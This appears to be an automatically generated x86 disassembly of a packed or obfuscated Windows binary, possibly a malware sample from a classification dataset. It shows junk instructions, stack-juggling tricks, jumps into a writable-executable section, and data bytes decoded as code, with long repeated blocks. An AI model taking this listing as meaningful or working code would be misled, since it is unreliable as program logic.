shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
not bl
dec bl
push ebx
push [ esp ]
inc ecx
lea esp [ esp + 0x8 ]
inc bl
inc ecx
sub_42247a
jmp rwxdata
lea esp [ esp + 0x28 ]
je rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
pushad
mov [ edi ] eax
call sub_425424
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
sub_42250b
push [ esp + 0x4 ]
lea esp [ esp + 0x28 ]
jb rwxdata
pushfd
lea esp [ esp + 0x4 ]
call sub_422e71
call sub_4254bf
add [ eax ] al
inc edi
je rwxdata
pushfd
push ebx
push [ esp + 0x8 ]
retn 0xc
xchg edx eax
sbb al 0x19
bound eax [ ecx - 0x5f35d41a ]
mov ebp 0x66dfbb0f
bt edi 0xc
inc ebx
push eax
add [ edx + 0x68d2f666 ] dh
in al dx
bound esp [ esi + eax * 4 + 0x66 ]
pushfd
pop [ esp + 0x2 ]
cmc
setl dl
cmc
call sub_4223a7
stc
stc
cmc
and ebx 0xfff
cmc
pushad
add [ edi + ebx ] dx
pushad
pushfd
lea esp [ esp + 0x44 ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
xor eax eax
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
movzx esi bl
clc
rol si cl
add edi ebx
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
cmc
cmp ah bl
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
daa
popad
je rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
lea esp [ esp + 0xc ]
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_422522
sub al 0x4f
stc
push 0x8c53ddd1
mov [ esp + 0x4 ] al
clc
rol al 0x3
pushad
pushfd
mov [ esp ] 0x75
lea esp [ esp + 0x2c ]
call sub_4225a3
cmc
push 0x33f4107b
push eax
push ecx
cmp eax 0x7d00
push [ esp ]
pushfd
mov [ esp + 0x10 ] 0x7daf
lea esp [ esp + 0x14 ]
jae rwxdata
not bl
dec bl
push ebx
push [ esp ]
inc ecx
lea esp [ esp + 0x8 ]
cmp cl 0x54
cmp ebx ebx
push eax
bt sp 0x6
cmp ah 0x5
pushad
lea esp [ esp + 0x24 ]
jae rwxdata
inc bl
inc ecx
or bl 0xfc
xchg ebp eax
shld ax bp 0x8
stc
mov eax ebp
shr bl cl
dec bl
pushad
mov bl 0x1
sub esp 0xffffffe0
test si sp
bt ax di
push 0x4c9718b0
xchg [ esp ] esi
cmp sp si
rcl si cl
mov esi edi
push 0x86cbe573
sub esi eax
jmp j_sub_422ee4
pushfd
call sub_422f76
add [ eax ] al
inc edi
je rwxdata
cmc
setl dl
cmc
call sub_4223a7
stc
stc
cmc
and ebx 0xfff
cmc
pushad
add [ edi + ebx ] dx
pushad
pushfd
lea esp [ esp + 0x44 ]
jmp rwxdata
je rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
cli
imul ebp [ esi + 0x67 ] 0x65707954
push edi
add [ ebx + eax * 4 - 0x63eb03bb ] bl
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
sub di si
sbb dl al
mov edx [ ebp - 0x4 ]
sar di 0xa
dec di
movsx di cl
sbb di 0xa30b
mov edi [ edx + 0x10 ]
pushfd
jmp rwxdata
xchg edx eax
pop ecx
sub cl [ ecx - 0x16 ]
imul edi [ edx + 0x24648d3d ] 0xb2840f28
inc esp
add [ eax ] al
pushad
mov [ edi ] eax
call sub_425424
dec ebp
and dl cl
add bh cl
je rwxdata
bt di dx
bt sp 0xf
test edi edi
pushfd
jmp rwxdata
shr [ eax ] 0x74
mov eax [ 0x5e2e4124 ]
mov dl 0xa5
0x9682
jo rwxdata
lea esp [ esp + 0x8 ]
je rwxdata
rol [ edx ] 0x1
stc
sub eax 0x224de115
outsb
push edi
add [ ebp + 0x2474ffc0 ] al
or al 0x8d
and al 0x40
je rwxdata
and esi 0xbda0ca2b
btc edi ebx
bt di 0xc
xor eax eax
movzx esi bl
clc
rol si cl
add edi ebx
sbb dx 0x556
lea ebx [ esi * 2 - 0x2493fa55 ]
jmp rwxdata
or si dx
bsr si bx
mov esi [ edx ]
cmc
pushad
call sub_422fd4
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
mov ebx eax
adc dx di
mov edx [ ebx + 0x3c ]
call sub_425a4e
add [ eax ] al
inc edi
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
or [ eax ] al

imul ebp [ ebp + 0x65 ] 0x656e6f5a
dec ecx
outsb
outsw
jb rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
sub esi eax
call sub_42698c
add [ eax ] al
inc edi
je rwxdata
imul ebp [ edi + 0x6e ] 0x746c6946
jb rwxdata
daa
popad
je rwxdata
cmp [ edx - 0x5611ed6a ] edi
stosb [ edi ]
cvttsd2si esi [ cs : ebx - 0x7028eb6d ]
stosd [ edi ]
push es
mov al [ 0x10773f63 ]
sbb al 0x8c
int3
in al 0x3f
scasd [ edi ]
les ebp [ eax + esi * 4 + 0x540c1b6f ]
jo rwxdata
imul ebp [ edi + 0x6e ] rw-data
pushfd
cmc
test eax eax
pushad
lea esp [ esp + 0x24 ]
jno rwxdata
dec ecx
rol [ edi ] 0x1
les esp [ edi ]
outsd
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
xchg bl al
not bl
jmp rwxdata
test sp 0x97a6
bt dx si
xor ecx ecx
call sub_4269eb
pushfd
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
je rwxdata
push ds
add [ eax ] al
add [ eax ] al
dec ebp
jne rwxdata
je rwxdata
xchg edx edx
push ecx
fsubp st1
push edx
adc dh 0x86
pushfd
ficomp [ edx ]
inc esi
mov cl [ esi + 0xa2192e1 ]
jno sub_4201cb
add [ ebx + 0x51 ] ebp
shr [ esi - 0x2fd83b5c ] 0x1
pop es
jb rwxdata
pushfd
lodsb [ esi ]
call sub_425cd8
sbb esi ecx
mov esi edx
stc
shl dl 0x6
mov edx eax
bt sp bx
cmc
pushfd
stc
xor ebx ebx
mov [ esp ] ah
mov [ esp ] 0x26c95f95
mov [ esp ] bl
shr eax 0x10
add esp 0x4
cmp dh 0xb6
cmp edx 0x92ee9dbc
clc
cmp [ esi ] 0x0
pushad
lea esp [ esp + 0x20 ]
je rwxdata
pushfd
lea esp [ esp + 0x8 ]
jo rwxdata
pushad
mov eax 0x1
pushad
pushfd
pushfd
lea esp [ esp + 0x48 ]
jmp rwxdata
call sub_4269b4
add [ eax ] al
dec eax
popad
jo rwxdata
mov ebp 0x9bebf399
mov ch 0x8f
aaa
push esp
jg rwxdata
je rwxdata
push esi
arpl [ eax + eax + 0x4b ] si
inc ebp
push edx
dec esi
inc ebp
dec esp
xor esi [ edx ]
insb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
mov dl 0x21
xor ch cl
add cl 0xdf
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x506c6175
jb rwxdata
imul ebp [ edi + 0x6e ] 0xe9c08500
in al dx
pop ebp
add [ eax ] al
pushad
pushfd
push [ esp + 0x2c ]
retn 0x30
push ebx
call sub_420983
btc bx cx
rcr di 0xf
add ch 0x47
mov ecx [ esi + 0x4 ]
xor di ax
sub ecx 0x8
bt si 0x1
dec edi
rcl bh cl
neg di
shr ecx 0x1
bsr edi edx
sar bx 0xc
ror bl 0x6
mov edi [ esi ]
rcl bl 0x4
adc bl 0x3d
add edi [ ebp - 0x4 ]
shld bx ax 0x1
add esi 0x8
sbb bx 0x7714
test cx 0x4fec
mov bx [ esi ]
pushfd
pushfd
jmp sub_421ff5
jmp rwxdata
je rwxdata
xchg si bx
bswap bx
pop ebx
pushad
mov edi [ esp + 0x20 ]
push [ esp + 0x4 ]
pop esi
mov esi [ esp + 0x24 ]
call sub_425a01
add [ eax ] al
push ebx
je rwxdata
mov ebx 0x42
add [ edi + 0x65 ] al
je rwxdata
inc ecx
insb
insb
outsd
arpl [ eax ] ax
popad
hlt
loope rwxdata
inc edx
jns rwxdata
jmp rwxdata
and al 0x24
je rwxdata
push ecx
lea esp [ esp + 0x4 ]
je rwxdata
call sub_421e6d
ja rwxdata
imul ebp [ ecx + 0x62 ] 0x5400656c
cwde
push edi
pushfd
les eax [ eax ]
jg rwxdata
bound ebp [ ebp ]
cdq
jmp rwxdata
push 0x48
cmp al 0x16
push esp
outsd
push edi
imul esp [ ebp + 0x43 ] 0x726168
add [ eax ] al
dec ecx
outsb
dec eax
popad
outsb
insb
add [ gs : ebp + 0xf082464 ] cl
test [ ebx - 0x63ffffd5 ] ebp
pushfd
push 0xd81db81
push edx
stosb [ edi ]
push 0x7e77faba
push esp
pushfd
lea esp [ esp + 0x1c ]
jmp rwxdata
cmc
cmp ah bl
jmp rwxdata
pushad
lea esp [ esp + 0x28 ]
jmp rwxdata
pushfd
add [ ebp - 0x4 ] 0x14
pushfd
pushfd
pushfd
test eax 0x80000000
pushfd
pushad
mov [ esp + 0x4 ] 0x5197
mov [ esp ] cx
lea esp [ esp + 0x2c ]
je rwxdata
call 0xffffffffd2e8aedd
imul [ eax ]
mov al [ 0xffffffffb2305032 ]
shl [ ebp - 0xa75796e ] 0x1
cmp [ ebp - 0x1e715a9e ] bh
mov cl 0xb1
and dh [ edi ]
test bl ch
xchg ecx eax
rcr [ ebp + 0x4d294d59 ] 0xb9
iretd
je rwxdata
inc ebx
push 0x7261
add [ ecx + 0x6e ] cl
adc eax 0x6db14d21
inc esp
add edi [ edi + 0x2b775f7b ]
dec esi
mov cl 0x54
cli
loop rwxdata
push ss
jb rwxdata
jmp rwxdata
push 0xd2332ef5
mov [ ebp - 0x8 ] eax
sbb eax esp
aas
clc
mov eax [ esi ]
cmc
test eax eax
push 0x15da7c7
mov [ esp + 0x4 ] 0x40
push [ esp ]
jmp rwxdata
test si 0x53a9
call sub_42526f
test cx 0xce0b
test esi esi
call sub_426c34
pushfd
jmp rwxdata
fisubr [ ecx + 0x2 ]
add al [ eax ]
ja rwxdata
xchg esp eax
std
xchg ebp eax
sub cl 0xda
mov eax [ 0xffffffff919a99b2 ]
dec ecx
or dl [ esi + 0x252f9 ]
xor eax 0x5200022f
and eax [ edx ]
add [ eax + 0x67 ] bh
add al [ eax ]
inc ecx
and [ edx ] eax
add [ edi + 0x6d000202 ] bh
sub al [ edx ]
add [ edx ] ah
add [ edx ] eax
add [ eax + 0x3b000202 ] ah
add al [ eax ]
dec eax
das
add al [ eax ]
sbb edx [ edx + 0x2 ]
add [ edx ] bl
and [ edx ] al
add [ ecx ] cl
add al [ eax ]
jpe __import_lookup_table_0(KERNEL32:GetStringTypeA)
pop edi
adc eax 0x5f58de6e
call 0xffffffffd2e8aedd
push eax
je rwxdata
jno rwxdata
pop edi
je rwxdata
pushad
mov [ esp + 0x8 ] 0x8455
push edi
lea esp [ esp + 0x24 ]
call sub_422e71
pushad
mov [ esp + 0x4 ] ah
lea esp [ esp + 0x20 ]
jae rwxdata
lea esp [ esp + 0xc ]
je rwxdata
and eax 0xffff
mov [ esp ] dx
mov [ esp ] dh
lea esp [ esp + 0x4 ]
jmp rwxdata
add al [ eax ]
mov esi 0x13000201
push esp
add al [ eax ]
out dx eax
and al [ edx ]
add [ 0x7900026a ] dl
pop ebp
add al [ eax ]
retn 0x225
add al [ eax ]
and ebp [ edi ]
add [ ecx - 0x6efffdd1 ] dl
add al [ edx ]
add [ edi ] dh
add al [ es : eax ]
pop edx
pop ebp
add al [ eax ]
pop edi
sub al 0x2
add dh al
pop ebx
add al [ eax ]
mov eax [ 0x3f000201 ]
pop eax
add al [ eax ]
and al 0x5a
add al [ eax ]
and [ ebp + 0x2 ] dl
add cl al
add eax 0x2f230002
add al [ eax ]
movsb [ edi ] [ esi ]
pop edi
add al [ eax ]
scasb [ edi ]
push esp
add al [ eax ]
add eax [ esi ]
add al [ eax ]
sub edx [ ecx + 0x2 ]
add [ ebx + 0x23 ] bh
add al [ eax ]
test eax 0xa000250
xor [ edx ] al
add [ edi + 0x2 ] bl
add al [ eax ]
and [ 0x69da0002 ] 0x2
mov ecx 0xc2710a65
loope rwxdata
insd
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
pushad
lea esp [ esp + 0x24 ]
xor edx eax
jne rwxdata
pushfd
pushfd
xchg [ esp + 0x4 ] eax
pop eax
cwde
push [ ebp - 0x8 ]
setle ah
lea eax [ 0x0 ]
pushad
mov [ esp + 0x1c ] rwxdata
pushfd
jmp rwxdata
push esp
popad
jae rwxdata
and [ edx + 0x25 ] ah
scasb [ edi ]
dec ebx
leave
xor ebx [ eax ]
test al 0x49
pop es
and ecx 0xf399bde1
jmp rwxdata
jb rwxdata
mov [ esp + 0x1c ] eax
pushfd
pushad
pushfd
pushfd
push [ esp + 0x48 ]
retn 0x4c
std
inc ebp
jb rwxdata
push 0x61
sbb eax [ ebx + 0x2aca3db5 ]
imul [ ebp - 0x6b0ac89a ]
fdiv [ bx + si + 0x22 ]
jno rwxdata
bound esp [ ebp - 0x4e4e1e72 ]
inc esp
popad
je rwxdata
pop edx
xchg esp eax
jne rwxdata
outsd
jb rwxdata
mov edi 0x2b775f7b
inc ecx
jbe rwxdata
cmc
add [ edi + ebx ] ax
sub_4225ad
pushfd
inc ecx
lea esp [ esp + 0x4 ]
pushfd
lea esp [ esp + 0x4 ]
call sub_422e71
call sub_4254bf
add [ eax ] al
inc edi
je rwxdata
xchg edx eax
sbb al 0x19
bound eax [ ecx - 0x5f35d41a ]
mov ebp 0x66dfbb0f
bt edi 0xc
inc ebx
push eax
add [ edx + 0x68d2f666 ] dh
in al dx
bound esp [ esi + eax * 4 + 0x66 ]
pushfd
pop [ esp + 0x2 ]
cmc
setl dl
cmc
call sub_4223a7
stc
stc
cmc
and ebx 0xfff
cmc
pushad
add [ edi + ebx ] dx
pushad
pushfd
lea esp [ esp + 0x44 ]
jmp rwxdata
mov [ ecx ] 0xdf
outsb
push 0x6c646e61
inc ebp
js rwxdata
stc
stc
add esi 0x2
pushad
mov [ esp + 0x4 ] si
mov [ esp ] al
dec ecx
push [ esp ]
call sub_420015
add [ eax ] al
dec ecx
outsb
je rwxdata
and al 0x8d
and al 0x24
call sub_422e71
pushad
call sub_42250b
btc si cx
jo rwxdata
test al 0x49
fbstp [ edx - 0xc9bbfa0 ]
sub eax 0x224de115
jb rwxdata
cmp bl [ esi - 0x26 ]
out dx al
cmp cl [ esi + 0xa ]
push es
xor [ eax + 0x10773f63 ] esp
jb rwxdata
mov esi edi
test edi 0x5702cfeb
bt edx edx
